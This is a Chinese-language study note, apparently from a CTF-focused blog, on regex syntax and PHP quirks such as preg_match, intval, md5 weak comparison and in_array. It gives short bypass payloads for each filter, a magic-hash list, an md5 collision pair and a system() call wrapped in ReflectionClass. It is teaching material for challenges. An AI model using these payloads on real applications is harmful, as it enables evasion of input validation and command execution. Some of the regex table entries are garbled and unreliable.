        <content type="html"><![CDATA[<span id="more"></span><h1 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h1><h2 id="元字符"><a href="#元字符" class="headerlink" title="元字符"></a>元字符</h2><div class="table-container"><table><thead><tr><th>符号</th><th>描述</th></tr></thead><tbody><tr><td>\d</td><td>匹配任意一个十进制数字，等价于[0-9]</td></tr><tr><td>\D</td><td>匹配任意一个除十进制数字以外的字符，等价于[\^0-9]</td></tr><tr><td>\s</td><td>匹配任意一个空白字符，等价于[\f\n\r\t\v]</td></tr><tr><td>\S</td><td>匹配除空白字符以外任何一个字符，等价于[\^\f\n\r\t\v]</td></tr><tr><td>\w</td><td>匹配任意一个数字、字母或下划线，等价于[0-9a-zA-Z]</td></tr><tr><td>\W</td><td>匹配除数字、字母或下划线以外的任意一个字符，等价于[\^0-9a-zA-Z]</td></tr><tr><td>*</td><td>匹配0次、1次或多次其前面的原子</td></tr><tr><td>+</td><td>匹配1次或多次其前面的原子</td></tr><tr><td>?</td><td>匹配0次或1次其前面的原子</td></tr><tr><td>.</td><td>匹配除了换行符外的任意一个字符</td></tr><tr><td>\</td><td></td><td>匹配两个或多个分支选择</td></tr><tr><td>{n}</td><td>表示其前面的原子恰好出现n次</td></tr><tr><td>{n,}</td><td>表示其前面的原子出现不少于n次</td></tr><tr><td>{n,m}</td><td>表示其前面的原子至少出现n次，最多出现m次</td></tr><tr><td>^或\A</td><td>匹配输入字符串的开始位置（或在多行模式下的开头，即紧随一换行符之后）</td></tr><tr><td>$或\Z</td><td>匹配输入字符串的结束位置（或在多行模式下的结尾，即紧随一换行符之前）</td></tr><tr><td>\b</td><td>匹配单词的边界</td></tr><tr><td>\B</td><td>匹配出单词边界以外的部分</td></tr><tr><td>[]</td><td>匹配方括号中指定的任意一个原子</td></tr><tr><td><sup><a href="#fn_" id="reffn_"></a></sup></td><td>匹配出方括号中的原子以外的任意一个字符</td></tr><tr><td>()</td><td>匹配其政体为一个原子，即模式单元，可以理解为由多个单个原子组成的大原子</td></tr></tbody></table></div><h2 id="模式修正符"><a href="#模式修正符" class="headerlink" title="模式修正符"></a>模式修正符</h2><div class="table-container"><table><thead><tr><th>符号</th><th>描述</th></tr></thead><tbody><tr><td>i</td><td>在和模式进行匹配时不区分大小写</td></tr><tr><td>m</td><td>将字符串视为多行，默认的正则开始”^”和结束”$”将目标字符串作为单一的一 “行” 字符（甚至其中包含有换行符也是如此）；如果在修饰符中加上”m”，那么开始和结束将会指字符串的每一行，每一行的开头就是”^”，结尾就是”$”</td></tr><tr><td>s</td><td>如果设定了此字符，模式中的圆点元字符”.”匹配所有的字符，包括换行符,即将字符串视为单行，换行符作为普通字符看待</td></tr><tr><td>x</td><td>模式中的空白忽略不计，除非它已经被转义</td></tr><tr><td>e</td><td>只用在pre_replace()函数中，在替换字符串中对逆向引用做正常的替换，将其作为PHP代码求值，并用其结果来替换所搜索的字符串</td></tr><tr><td>U</td><td>贪婪模式，最大限度匹配</td></tr><tr><td>D</td><td>模式中的”$”仅匹配目标字符串的结尾，没有此选项时，如果最后一个字符是换行符的话，美元符号也会匹配此字符之前；如果设定了m修正字符则忽略此选项</td></tr></tbody></table></div><h2 id="贪婪匹配与惰性匹配"><a href="#贪婪匹配与惰性匹配" class="headerlink" title="贪婪匹配与惰性匹配"></a>贪婪匹配与惰性匹配</h2><ul><li>贪婪匹配：匹配尽可能多的字符</li><li>惰性匹配：匹配尽可能少的字符</li><li>“?”：如果紧跟在任何量词*、+、?或{}的后面，会使量词编程惰性，例如对”123abc”使用<code>/\d+/</code>将会匹配”123”，而使用<code>/\d+?/</code>只会匹配到”1”</li></ul><div class="table-container"><table><thead><tr><th>函数符</th><th>描述</th></tr></thead><tbody><tr><td>*?</td><td>零次或多次，但尽可能少的匹配</td></tr><tr><td>+?</td><td>一次或多次，但尽可能少的匹配</td></tr><tr><td>??</td><td>0次或1次，但尽可能少的匹配</td></tr><tr><td>{n,}?</td><td>至少n次，但尽可能少的匹配</td></tr><tr><td>{n,m}?</td><td>n到m次 ，但尽可能少的匹配</td></tr></tbody></table></div><h1 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h1><h2 id="preg-match"><a href="#preg-match" class="headerlink" title="preg_match()"></a>preg_match()</h2><h3 id="数组绕过"><a href="#数组绕过" class="headerlink" title="数组绕过"></a>数组绕过</h3><ul><li>preg_match()只能处理字符串，当传入的subject是数组时会返回false</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[0-9]/&quot;</span>, <span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><code>payload: num[]=1</code></p><h3 id="换行绕过"><a href="#换行绕过" class="headerlink" title="换行绕过"></a>换行绕过</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^php$/im&#x27;</span>, <span class="variable">$a</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^php$/i&#x27;</span>, <span class="variable">$a</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;hacker&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>payload: cmd=%0aphp</code></p><h3 id="最大回溯次数绕过"><a href="#最大回溯次数绕过" class="headerlink" title="最大回溯次数绕过"></a>最大回溯次数绕过</h3><blockquote><p>PHP 为了防止正则表达式的拒绝服务攻击（reDOS），给 pcre 设定了一个回溯次数上限 pcre.backtrack_limit<br>回溯次数上限默认是 100 万。如果回溯次数超过了 100 万，preg_match 将不再返回非 1 和 0，而是 false。</p></blockquote><h2 id="intval"><a href="#intval" class="headerlink" title="intval()"></a>intval()</h2><ul><li><p>获取变量的整数值</p></li><li><p>成功时返回 var 的 integer 值，失败时返回 0，空的 array 返回 0，非空的 array 返回 1</p></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="number">42</span>);                      <span class="comment">// 42</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="number">4.2</span>);                     <span class="comment">// 4</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="string">&#x27;42&#x27;</span>);                    <span class="comment">// 42</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="string">&#x27;+42&#x27;</span>);                   <span class="comment">// 42</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="string">&#x27;-42&#x27;</span>);                   <span class="comment">// -42</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="number">042</span>);                     <span class="comment">// 34</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="string">&#x27;042&#x27;</span>);                   <span class="comment">// 42</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="number">1e10</span>);                    <span class="comment">// 1410065408</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="string">&#x27;1e10&#x27;</span>);                  <span class="comment">// 1</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="number">0x1A</span>);                    <span class="comment">// 26</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="number">42000000</span>);                <span class="comment">// 42000000</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="number">420000000000000000000</span>);   <span class="comment">// 0</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="string">&#x27;420000000000000000000&#x27;</span>); <span class="comment">// 2147483647</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="number">42</span>, <span class="number">8</span>);                   <span class="comment">// 42</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="string">&#x27;42&#x27;</span>, <span class="number">8</span>);                 <span class="comment">// 34</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="keyword">array</span>());                 <span class="comment">// 0</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="keyword">array</span>(<span class="string">&#x27;foo&#x27;</span>, <span class="string">&#x27;bar&#x27;</span>));     <span class="comment">// 1</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="literal">false</span>);                   <span class="comment">// 0</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="literal">true</span>);                    <span class="comment">// 1</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="字符绕过"><a href="#字符绕过" class="headerlink" title="字符绕过"></a>字符绕过</h3><ul><li>intval()而言，如果参数是字符串，则返回字符串中第一个不是数字的字符之前的数字串所代表的整数值。如果字符串第一个是‘-’，则从第二个开始算起。</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$num</span>===<span class="string">&quot;4476&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>)===<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><code>payload: num=4476a</code></p><h3 id="科学计数法"><a href="#科学计数法" class="headerlink" title="科学计数法"></a>科学计数法</h3><ul><li>intval()函数如果base为0，则var中存在字母的话遇到字母就停止读取，但是e这个字母比较特殊，可以在PHP中表示科学计数法。</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$num</span>==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>)==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><code>payload: num=4476e1</code></p><h3 id="进制转换"><a href="#进制转换" class="headerlink" title="进制转换"></a>进制转换</h3><blockquote><p>0b?? : 二进制<br>0??? : 八进制<br>0X?? : 十六进制</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$num</span>==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-z]/i&quot;</span>, <span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>)==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><code>payload: num=010574</code></p><h3 id="小数点绕过"><a href="#小数点绕过" class="headerlink" title="小数点绕过"></a>小数点绕过</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$num</span>===<span class="string">&quot;4476&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-z]/i&quot;</span>, <span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">strpos</span>(<span class="variable">$num</span>, <span class="string">&quot;0&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>)===<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><code>payload: num=4476.0</code></p><h2 id="strpos"><a href="#strpos" class="headerlink" title="strpos()"></a>strpos()</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">strpos</span>() - 查找字符串在另一字符串中第一次出现的位置（区分大小写）</span><br><span class="line"><span class="title function_ invoke__">stripos</span>() 函数查找字符串在另一字符串中第一次出现的位置（不区分大小写）</span><br><span class="line"><span class="title function_ invoke__">strrpos</span>() - 查找字符串在另一字符串中最后一次出现的位置（区分大小写）</span><br><span class="line"><span class="title function_ invoke__">strripos</span>() - 查找字符串在另一字符串中最后一次出现的位置（不区分大小写）</span><br></pre></td></tr></table></figure><ul><li>利用+代替空格绕过</li></ul><h2 id="md5"><a href="#md5" class="headerlink" title="md5"></a>md5</h2><ul><li><a href="https://www.freesion.com/article/53561386476/">md5绕过</a></li></ul><h3 id="弱比较"><a href="#弱比较" class="headerlink" title="弱比较"></a>弱比较</h3><ul><li><p>只要两个数的md5加密后的值以0e开头就可以绕过，因为php在进行弱类型比较时,会现转换字符串的类型，在进行比较，而在比较是因为两个数都是以0e开头会被认为是科学计数法，0e后面加任何数在科学计数法中都是0，所以两数相等</p></li><li><p>在这样的弱比较里，0e开头的会被识别成科学计数法，结果均为0，比较时<code>0=0</code>为true绕过</p></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">240610708</span>:<span class="number">0e462097431906509019562988736854</span></span><br><span class="line">QLTHNDT:<span class="number">0e405967825401955372549139051580</span></span><br><span class="line">QNKCDZO:<span class="number">0e830400451993494058024219903391</span></span><br><span class="line">PJNPDWY:<span class="number">0e291529052894702774557631701704</span></span><br><span class="line">NWWKITQ:<span class="number">0e763082070976038347657360817689</span></span><br><span class="line">NOOPCJF:<span class="number">0e818888003657176127862245791911</span></span><br><span class="line">MMHUWUV:<span class="number">0e701732711630150438129209816536</span></span><br><span class="line">MAUXXQC:<span class="number">0e478478466848439040434801845361</span></span><br></pre></td></tr></table></figure><h3 id="强比较"><a href="#强比较" class="headerlink" title="强比较"></a>强比较</h3><ul><li>数组绕过</li><li>如果传入的不是字符串而是数组，不但md5()函数不会报错，结果还会返回null，在强比较里面<code>null=null</code>为true绕过</li></ul><h3 id="md5碰撞"><a href="#md5碰撞" class="headerlink" title="md5碰撞"></a>md5碰撞</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if($_GET[&#x27;a&#x27;]!==$_GET[&#x27;b&#x27;] &amp;&amp; md5($_GET[&#x27;a&#x27;])===md5($_GET[&#x27;b&#x27;]))</span><br><span class="line">&#123;</span><br><span class="line">echo $flag;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>真实md5碰撞，因为此时不能输入数组了，只能输入字符串</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a=M%C9h%FF%<span class="number">0</span>E%E3%<span class="number">5</span>C%<span class="number">20</span>%<span class="number">95</span>r%D4w%<span class="number">7</span>Br%<span class="number">15</span>%<span class="number">87</span>%D3o%A7%B2%<span class="number">1</span>B%DCV%B7J%<span class="number">3</span>D%C0x%<span class="number">3</span>E%<span class="number">7</span>B%<span class="number">95</span>%<span class="number">18</span>%AF%BF%A2%<span class="number">00</span>%A8%<span class="number">28</span>K%F3n%<span class="number">8</span>EKU%B3_Bu%<span class="number">93</span>%D8Igm%A0%D1U%<span class="number">5</span>D%<span class="number">83</span>%<span class="number">60</span>%FB_%<span class="number">07</span>%FE%A2</span><br><span class="line">&amp;b=M%C9h%FF%<span class="number">0</span>E%E3%<span class="number">5</span>C%<span class="number">20</span>%<span class="number">95</span>r%D4w%<span class="number">7</span>Br%<span class="number">15</span>%<span class="number">87</span>%D3o%A7%B2%<span class="number">1</span>B%DCV%B7J%<span class="number">3</span>D%C0x%<span class="number">3</span>E%<span class="number">7</span>B%<span class="number">95</span>%<span class="number">18</span>%AF%BF%A2%<span class="number">02</span>%A8%<span class="number">28</span>K%F3n%<span class="number">8</span>EKU%B3_Bu%<span class="number">93</span>%D8Igm%A0%D1%D5%<span class="number">5</span>D%<span class="number">83</span>%<span class="number">60</span>%FB_%<span class="number">07</span>%FE%A2</span><br></pre></td></tr></table></figure><h2 id="in-array"><a href="#in-array" class="headerlink" title="in_array()"></a>in_array()</h2><ul><li><p>搜索数组中是否存在指定的值。</p></li><li><p>没有设置第三个参数时就可以形成自动转换</p></li><li><code>eg:x=1.php自动转换为1</code></li></ul><h1 id="php弱比较"><a href="#php弱比较" class="headerlink" title="php弱比较"></a>php弱比较</h1><h2 id="var-dump"><a href="#var-dump" class="headerlink" title="var_dump()"></a>var_dump()</h2><ul><li>显示变量相关信息</li><li>如果比较一个数字和字符串或者比较涉及到数字内容的字符串，则字符串会被转换成数值并且比较按照数值来进行<ul><li>如果该字符串以合法的数值开始，则使用该数值，否则其值为0。</li></ul></li></ul><h2 id="字符串和数字比较"><a href="#字符串和数字比较" class="headerlink" title="字符串和数字比较"></a>字符串和数字比较</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="string">&#x27;a&#x27;</span> == <span class="number">0</span>);<span class="comment">//bool(true)</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="string">&#x27;1a&#x27;</span> == <span class="number">1</span>);<span class="comment">//bool(true)</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="string">&#x27;12a&#x27;</span> == <span class="number">1</span>);<span class="comment">//bool(false)</span></span><br></pre></td></tr></table></figure><ul><li>会出现上面的结果是因为字符串在和数字比较的时候会将字符串转化为数字，比如a转换失败成false，false又和0弱类型比较是相等的，所以第一个是true。</li><li>但是如果字符串是以数字开头的，那么就会转成这个数字再做比较，所以第二个也是true，第三个则是因为转成数字后变成了12，不等于1，则为false。</li></ul><h2 id="布尔true和任意比较"><a href="#布尔true和任意比较" class="headerlink" title="布尔true和任意比较"></a>布尔true和任意比较</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">var_dump</span>(True == <span class="number">0</span>);<span class="comment">//bool(false)</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(True == <span class="string">&#x27;False&#x27;</span>);<span class="comment">//bool(true)</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(True == <span class="number">2</span>);<span class="comment">//bool(true)</span></span><br></pre></td></tr></table></figure><ul><li>bool 1和任何比较都相等，除了0和false，因为0也认为是bool false，true是不等于false的，所以第一条是false，其余的全是true。</li></ul><h2 id="hash值和字符串“0”比较"><a href="#hash值和字符串“0”比较" class="headerlink" title="hash值和字符串“0”比较"></a>hash值和字符串“0”比较</h2><ul><li>hash: 哈希算法</li><li>特点：<ul><li>对于特定的hash算法输出结果的长度总是一定的；</li><li>对于相同的输入内容不管执行多少次hash函数，总会得到相同的hash值；</li><li>对于输入字符串哪怕及其微小的变动也会引起输出结果巨大的变化</li><li>哈希过程是单向的，即不能通过特定的函数从hash值恢复出原始数据。</li></ul></li><li>常见的hash算法: MD5、SHA1、SHA224、SHA256、SHA512等</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$str1</span> = <span class="string">&quot;a&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">md5</span>(<span class="variable">$str1</span>);<span class="comment">//0cc175b9c0f1b6a831c399e269772661</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$str1</span>) == <span class="string">&#x27;0&#x27;</span>);<span class="comment">//bool(false)</span></span><br><span class="line">---------------------------------------------------------</span><br><span class="line"><span class="variable">$str2</span> = <span class="string">&quot;s224534898e&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">md5</span>(<span class="variable">$str2</span>);<span class="comment">//0e420233178946742799316739797882</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$str2</span>) == <span class="string">&#x27;0&#x27;</span>);<span class="comment">//bool(true)</span></span><br><span class="line">---------------------------------------------------------</span><br><span class="line"><span class="variable">$str3</span> = <span class="string">&#x27;a1b2edaced&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">md5</span>(<span class="variable">$str3</span>);<span class="comment">//0e45ea817f33691a3dd1f46af81166c4bool</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$str3</span>) == <span class="string">&#x27;0&#x27;</span>);<span class="comment">//bool(false)</span></span><br><span class="line">---------------------------------------------------------</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="string">&#x27;0e111111111111&#x27;</span> == <span class="string">&#x27;0&#x27;</span>);<span class="comment">//bool(true) </span></span><br></pre></td></tr></table></figure><ul><li>只要是以0e开头，后面为数字的字符串和字符串0比较值都是相等的，因为不管0不论和多少相乘都是0。</li><li>所以当hash出来的32个值，开头前两个为0e，后面全部为数字的话，他们就会和字符串0相等的。</li><li>第一条只是0开头，所以只能当普通字符串，结果为false。</li><li>第二条0e后面全为数字，符合要求，结果为true。</li><li>第三条虽然为0e，但是后面不全为数字，所以结果为false。</li></ul><h1 id="优先级"><a href="#优先级" class="headerlink" title="优先级"></a>优先级</h1><h2 id="符号"><a href="#符号" class="headerlink" title="符号"></a>符号</h2><ul><li>&amp;&amp;与||的优先级高于=</li><li>=的优先级高于and与or</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$bA</span> = <span class="literal">true</span>;</span><br><span class="line"><span class="variable">$bB</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$b1</span> = <span class="variable">$bA</span> <span class="keyword">and</span> <span class="variable">$bB</span>;</span><br><span class="line"><span class="variable">$b2</span> = <span class="variable">$bA</span> &amp;&amp; <span class="variable">$bB</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$b1</span>); <span class="comment">// $b1 = true</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$b2</span>); <span class="comment">// $b2 = false</span></span><br><span class="line"><span class="variable">$bA</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$bB</span> = <span class="literal">true</span>;</span><br><span class="line"><span class="variable">$b3</span> = <span class="variable">$bA</span> <span class="keyword">or</span> <span class="variable">$bB</span>;</span><br><span class="line"><span class="variable">$b4</span> = <span class="variable">$bA</span> || <span class="variable">$bB</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$b3</span>); <span class="comment">// $b3 = false</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$b4</span>); <span class="comment">// $b4 = true</span></span><br></pre></td></tr></table></figure><h2 id="get-post"><a href="#get-post" class="headerlink" title="get post"></a>get post</h2><blockquote><p>http协议默认先以get方式获取数据，无论是否以哪种方式发起的，总是get方式优先，即通过get方式获取到了数据就不会再去通过post方式获取一遍，如果get方式获取不到，再以post方式获取。</p></blockquote><h1 id="ReflectionClass反射类"><a href="#ReflectionClass反射类" class="headerlink" title="ReflectionClass反射类"></a>ReflectionClass反射类</h1><ul><li>可以和system连用：<br><code>Reflectionclass(system(&#39;cat ls&#39;));</code></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="variable">$flag</span>=<span class="string">&quot;flag&#123;123123123&#125;&quot;</span>;</span><br><span class="line"><span class="keyword">const</span>  PI=<span class="number">3.14</span>;</span><br><span class="line"><span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">hello</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;hello&lt;/br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">ReflectionClass</span>(<span class="string">&#x27;A&#x27;</span>);</span><br><span 